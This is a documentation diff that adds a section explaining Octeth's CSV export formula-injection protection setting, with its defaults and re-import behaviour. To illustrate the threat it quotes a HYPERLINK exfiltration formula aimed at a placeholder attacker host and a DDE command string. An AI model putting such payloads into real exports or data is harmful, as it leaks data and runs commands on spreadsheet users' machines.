@@ -554,6 +554,50 @@ The `.oempro_env` file is the primary configuration file for your Octeth install
 
     On a **fresh install**, `install:start` lowers `SENDENGINE_CPU_LIMIT` and `LINK_PROXY_CPU_LIMIT` to fit the host when it has fewer than four cores — see *Octeth Installation* for the sizing table. Existing installs are never adjusted automatically.
 
+37. **CSV Export Formula Protection**
+
+    ```bash
+    CSV_EXPORT_FORMULA_PROTECTION=true      # Prefix formula-looking CSV cells with an apostrophe (default: true)
+    ```
+
+    Protects the people who open your CSV exports from **spreadsheet formula injection**.
+
+    Subscriber custom-field values are supplied by whoever fills in your signup forms, so they are attacker-controlled by design. Excel, LibreOffice Calc and Google Sheets *evaluate* a cell whose first character is `=`, `+`, `-` or `@` — and OWASP also lists **TAB** and **CR**, because some importers strip leading control characters before deciding whether a cell is a formula. A subscriber can therefore store `=HYPERLINK("https://evil.example/?d="&A1,"click")` in a custom field, and the account owner who exports their own list gets a live link that exfiltrates the neighbouring cell when clicked. Legacy Excel additionally honors `=cmd|'/c calc'!A1` (DDE). Nothing needs to be wrong with Octeth for this to work — only an export that faithfully reproduces attacker-supplied text.
+
+    When enabled, every CSV Octeth produces routes its cells through one shared helper that prefixes such a value with a **single quote**. Every major spreadsheet reads that as "this cell is text, do not evaluate it" and does not display the apostrophe in the cell.
+
+    Correct CSV quoting does **not** fix this on its own. Quoting decides how the file *parses*; the spreadsheet still *evaluates* the resulting cell.
+
+    **Covered exports:** subscriber exports, multi-list subscriber exports, campaign exports and the campaign comparison export, journey report exports, the admin campaign report export, scheduled automated campaign reports, account reports, and the failed-rows report produced by an import.
+
+    **What changes in your files — this is visible.** Ordinary, non-malicious values gain a leading apostrophe in the raw bytes:
+
+    | Stored value | In the exported file |
+    |---|---|
+    | `-10%` | `'-10%` |
+    | `+15551234567` | `'+15551234567` |
+    | `@handle` | `'@handle` |
+    | `=1+1` | `'=1+1` |
+
+    Generated report cells are affected too — the "vs previous period" deltas in account reports (`+12.3%`, `-4.5pt`) and any negative residual in journey report rows.
+
+    **Re-importing into Octeth is lossless.** Octeth's own CSV import strips exactly one leading apostrophe, and only when what follows it would itself have been prefixed, so export → re-import does not accumulate apostrophes:
+
+    - `=1+1` → exported `'=1+1` → re-imported `=1+1`
+    - `-10%` → exported `'-10%` → re-imported `-10%`
+    - `'hello` (an apostrophe you typed yourself, in front of ordinary text) → exported `'hello` → re-imported `'hello`, unchanged
+
+    One edge case: a value you deliberately stored as `'=1+1` (your own apostrophe in front of a formula character) is indistinguishable from the protection prefix and comes back as `=1+1` — once. It does not change again on later round trips. This strip is **always** active and is not affected by the setting.
+
+    **Third-party consumers are not covered.** Anything outside Octeth that reads your exports — a BI tool, a CRM sync, a script — sees the apostrophe and must strip it itself. That is the only reason to turn this off:
+
+    ```bash
+    # Restores byte-identical pre-v5.9.3 export output
+    CSV_EXPORT_FORMULA_PROTECTION=false
+    ```
+
+    **API note.** The `emailgateway.exportevents` API endpoint has applied this prefixing since it shipped and continues to do so **unconditionally**, ignoring this setting, so existing API callers see no change in either direction.
+
 ::: warning Important
 The `.oempro_env` file contains sensitive credentials. Never commit this file to version control or share it publicly. Keep secure backups in encrypted storage.
 :::
